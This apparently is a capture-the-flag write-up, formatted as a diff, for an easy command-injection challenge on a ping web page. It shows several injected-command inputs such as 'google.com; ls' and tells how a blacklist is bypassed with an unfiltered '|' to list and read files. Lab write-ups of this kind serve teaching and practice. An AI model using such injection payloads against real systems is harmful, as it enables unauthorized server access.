@@ -1,0 +1,31 @@
+Challenge 044 : Command Injection Easy
+
+A simple web page that pings and tells you the information abt the web server.
+google.com  :  gives the result as such
+fb.com : gives the result like 200  OK or 301 redirect
+and other information too lot of information 
+
+let's try something else
+ls 
+whoami 
+
+google.com; ls
+google.com && ls
+doesnt' work all filtered
+
+let's try
+google.com || ls  .. this too filtered
+
+kk the blacklist is provided to you.. so you know the symbols that are blocked.. like ; & | are blocked 
+ || --> ''  
+
+ and '| ' --> '' 
+ aah.. there's no filter for '|'
+ 
+let's tryy google.com |ls -al 
+and boom u're able to get all the files in the directory
+
+cat the EPL.txt and enter it on the login page
+
+Hope You enjoyed it !!!
+
